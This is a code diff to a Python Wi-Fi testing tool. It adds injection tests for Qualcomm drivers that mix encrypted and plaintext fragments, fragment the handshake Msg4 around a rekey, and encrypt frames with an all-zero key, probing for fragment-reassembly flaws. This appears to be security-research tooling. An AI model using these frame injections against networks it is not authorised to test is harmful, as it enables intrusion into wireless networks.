@@ -109,7 +109,7 @@ class Action():
 	# Reconnect: force a reconnect
 	GetIp, Rekey, Reconnect, Roam, Inject, Func = range(6)
 
-	def __init__(self, trigger, action=Inject, func=None, enc=False, frame=None, inc_pn=1, delay=None, wait=None):
+	def __init__(self, trigger, action=Inject, func=None, enc=False, frame=None, inc_pn=1, delay=None, wait=None, key=None):
 		self.trigger = trigger
 		self.action = action
 		self.func = func
@@ -129,6 +129,7 @@ class Action():
 		self.inc_pn = inc_pn
 		self.delay = delay
 		self.frame = frame
+		self.key = key
 
 	def get_action(self):
 		return self.action
@@ -406,6 +407,100 @@ class QcaDriverTest(Test):
 		self.actions[3].frame = frames1[1]
 
 
+class QcaTestSplit(Test):
+	"""
+	Mixed encrypted and plaintext are both queued in ol_rx_reorder_store_frag,
+	and both forwarded when all fragments are collected. But when sending
+	[Encrypted, plaintext] and [plaintext, encrypted] the two encrypted fragments
+	are not reassembled. So we cannot this this trick.
+	"""
+	def __init__(self, ptype):
+		super().__init__([Action(Action.Connected, Action.GetIp),
+				  Action(Action.Connected, enc=False, delay=0.2), # 100 (dropped b/c plaintext)
+				  Action(Action.Connected, enc=True, inc_pn=5),	  # 105
+				  Action(Action.Connected, enc=True, inc_pn=-1),   # 104
+				  Action(Action.Connected, enc=False)])	   	  # 112 (dropped b plaintext)
+		self.ptype = ptype
+		self.check_fn = None
+
+	def check(self, p):
+		if self.check_fn == None:
+			return False
+		return self.check_fn(p)
+
+	def generate(self, station):
+		log(STATUS, "Generating QCA driver test", color="green")
+
+		# Generate the header and payload
+		header1, request1, self.check_fn = generate_request(station, self.ptype, prior=2)
+		header2, request2, self.check_fn = generate_request(station, self.ptype, prior=2)
+		header1.SC = 10 << 4
+		header2.SC = 10 << 4
+
+		# Generate all the individual (fragmented) frames
+		frames1 = create_fragments(header1, request1 / Raw(b"1"), 2)
+		frames2 = create_fragments(header2, request2 / Raw(b"2"), 2)
+
+		self.actions[0].frame = frames1[0]
+		self.actions[1].frame = frames2[1] # hopefully dropped
+		self.actions[2].frame = frames2[0] # hopefully dropped
+		self.actions[3].frame = frames1[1]
+
+		self.actions[0].frame.TID = 2
+		self.actions[1].frame.TID = 2
+		self.actions[2].frame.TID = 2
+		self.actions[3].frame.TID = 2
+
+		#self.actions[2].frame.addr3 = "ff:ff:ff:ff:ff:ff"
+
+
+class QcaDriverRekey(Test):
+	def __init__(self, ptype):
+		super().__init__([Action(Action.Connected, Action.GetIp),		# Get IP
+				  Action(Action.Connected, Action.Rekey),		# Wait for rekey
+				  Action(Action.BeforeAuth, enc=True, inc_pn=2),	# Inject first fragment ping
+				  Action(Action.BeforeAuth, func=self.fragment_msg4),	# Fragment Msg4
+				  Action(Action.BeforeAuth, enc=True, inc_pn=-2),	# Inject first fragment Msg4
+				  Action(Action.BeforeAuth, enc=True, inc_pn=1),	# Inject second fragment Msg4
+				  Action(Action.AfterAuth, enc=True, inc_pn=2)])	# Inject second fragment ping
+		self.ptype = ptype
+		self.check_fn = None
+
+	def fragment_msg4(self, station, eapol):
+		header = station.get_header(prior=4)
+		header.SC = 10 << 4
+
+		payload = LLC()/SNAP()/eapol
+
+		frags = create_fragments(header, payload, 2)
+
+		# All Connected and BeforeAuth actions have been popped by now
+		self.actions[0].frame = frags[0]
+		self.actions[1].frame = frags[1]
+
+		# Prevent Station code from sending the EAPOL frame
+		return True
+
+	def check(self, p):
+		if self.check_fn == None:
+			return False
+		return self.check_fn(p)
+
+	def generate(self, station):
+		log(STATUS, "Generating QCA driver test", color="green")
+
+		# Generate the header and payload
+		header, request, self.check_fn = generate_request(station, self.ptype, prior=2)
+		header.SC = 20 << 4
+
+		# Generate all the individual (fragmented) frames
+		frames = create_fragments(header, request, 2)
+
+		# All Connected actions have been popped by now
+		self.actions[0].frame = frames[0]
+		self.actions[4].frame = frames[1]
+
+
 # ----------------------------------- Abstract Station Class -----------------------------------
 
 class Station():
@@ -533,9 +628,12 @@ class Station():
 		self.set_header(header, prior=prior, **kwargs)
 		return header
 
-	def encrypt(self, frame, inc_pn=1):
+	def encrypt(self, frame, inc_pn=1, force_key=None):
 		self.pn += inc_pn
 		key, keyid = (self.tk, 0) if int(frame.addr1[1], 16) & 1 == 0 else (self.gtk, self.gtk_idx)
+		if force_key == 0:
+			log(STATUS, "Encrypting with all-zero key")
+			key = b"\x00" * len(key)
 		encrypted = encrypt_ccmp(frame, key, self.pn, keyid)
 		return encrypted
 
@@ -557,6 +655,8 @@ class Station():
 		return self.peermac
 
 	def trigger_eapol_events(self, eapol):
+		result = None
+
 		key_type   = eapol.key_info & 0x0008
 		key_ack    = eapol.key_info & 0x0080
 		key_mic    = eapol.key_info & 0x0100
@@ -567,32 +667,35 @@ class Station():
 		# Inject any fragments before authenticating
 		if not self.txed_before_auth:
 			log(STATUS, "Action.StartAuth", color="green")
-			self.perform_actions(Action.StartAuth)
+			result = self.perform_actions(Action.StartAuth, eapol=eapol)
 			self.txed_before_auth = True
 			self.txed_before_auth_done = False
 
 		# Inject any fragments when almost done authenticating
 		elif is_msg3_or_4 and not self.txed_before_auth_done:
 			log(STATUS, "Action.BeforeAuth", color="green")
-			self.perform_actions(Action.BeforeAuth)
+			result = self.perform_actions(Action.BeforeAuth, eapol=eapol)
 			self.txed_before_auth_done = True
 			self.txed_before_auth = False
 
 		self.time_connected = None
+		return result
 
 	def handle_eapol_tx(self, eapol):
 		eapol = EAPOL(eapol)
-		self.trigger_eapol_events(eapol)
+		send_it = self.trigger_eapol_events(eapol)
 
-		# - Send over monitor interface to assure order compared to injected fragments.
-		# - This is also important because the station might have already installed the
-		#   key before this script can send the EAPOL frame over Ethernet (but we didn't
-		#   yet request the key from this script).
-		# - Send with high priority, otherwise Action.AfterAuth might be send before
-		#   the EAPOL frame by the Wi-Fi chip.
-		self.send_mon(eapol)
+		if send_it == None:
+			# - Send over monitor interface to assure order compared to injected fragments.
+			# - This is also important because the station might have already installed the
+			#   key before this script can send the EAPOL frame over Ethernet (but we didn't
+			#   yet request the key from this script).
+			# - Send with high priority, otherwise Action.AfterAuth might be send before
+			#   the EAPOL frame by the Wi-Fi chip.
+			self.send_mon(eapol)
 
-	def perform_actions(self, trigger):
+	def perform_actions(self, trigger, **kwargs):
+		result = None
 		if self.test == None:
 			return
 
@@ -600,15 +703,16 @@ class Station():
 		while self.test.next_trigger_is(trigger):
 			act = self.test.next_action(self)
 
+			# TODO: Previously scheduled Connected on AfterAuth should be cancelled??
 			if act.action == Action.GetIp and not self.obtained_ip:
 				self.waiting_on_ip = True
 				self.daemon.get_ip(self)
 				break
 
 			elif act.action == Action.Func:
-				log(STATUS, "[Executing Function]")
-				if act.func(self) != None:
-					break
+				result = act.func(self, **kwargs)
+				log(STATUS, "[Executed Function] Result=" + str(result))
+				# TODO: How to collect multiple results on one trigger?
 
 			elif act.action == Action.Rekey:
 				# Force rekey as AP, wait on rekey as client
@@ -632,8 +736,8 @@ class Station():
 
 				if act.encrypted:
 					assert self.tk != None and self.gtk != None
-					frame = self.encrypt(act.frame, inc_pn=act.inc_pn)
-					log(STATUS, "Encrypted fragment with key " + self.tk.hex())
+					log(STATUS, "Encrypting with key " + self.tk.hex() + " " + repr(frame))
+					frame = self.encrypt(act.frame, inc_pn=act.inc_pn, force_key=act.key)
 				else:
 					frame = act.frame
 
@@ -654,6 +758,8 @@ class Station():
 		if self.options.inject_workaround and frame != None and frame.FCfield & 0x4 != 0:
 			self.daemon.inject_mon(Dot11(addr1="ff:ff:ff:ff:ff:ff"))
 			print("[Injected packet] Prevent ath9k_htc bug after fragment injection")
+
+		return result
 
 	def handle_authenticated(self):
 		"""Called after completion of the 4-way handshake or similar"""
@@ -962,7 +1068,7 @@ class Supplicant(Daemon):
 		else:
 			self.send_dhcp_request(self.dhcp_offer_frame)
 
-		self.time_retrans_dhcp = time.time() + 1
+		self.time_retrans_dhcp = time.time() + 2.5
 
 	def rekey(self, station):
 		# WAG320N: does not work (Broadcom - no reply)
@@ -979,6 +1085,7 @@ class Supplicant(Daemon):
 
 	def time_tick(self):
 		if self.time_retrans_dhcp != None and time.time() > self.time_retrans_dhcp:
+			log(WARNING, "Retransmitting DHCP message", color="orange")
 			self.get_ip(self)
 
 		self.station.time_tick()
@@ -1026,7 +1133,7 @@ class Supplicant(Daemon):
 			clientip = p[BOOTP].yiaddr
 			serverip = p[IP].src
 			self.time_retrans_dhcp = None
-			log(STATUS, f"Received DHCP ack. My ip is {clientip} and router is {serverip}.")
+			log(STATUS, f"Received DHCP ack. My ip is {clientip} and router is {serverip}.", color="green")
 
 			self.initialize_peermac(p.src)
 			self.initialize_ips(clientip, serverip)
@@ -1110,8 +1217,14 @@ def cleanup():
 	daemon.stop()
 
 def prepare_tests(test_name):
-	if test_name == "qca_driver":
+	if test_name == "qca_test":
 		test = QcaDriverTest(REQ_ICMP)
+
+	elif test_name == "qca_split":
+		test = QcaTestSplit(REQ_ICMP)
+
+	elif test_name == "qca_rekey":
+		test = QcaDriverRekey(REQ_ICMP)
 
 	elif test_name == "ping":
 		# Simple ping as sanity check
@@ -1221,7 +1334,7 @@ if __name__ == "__main__":
 	# Parse remaining options
 	global_log_level -= args.debug
 
-	# Now start the tests
+	# Now start the tests --- TODO: Inject Deauths before connecting with client...
 	if args.ap:
 		daemon = Authenticator(options)
 	else:
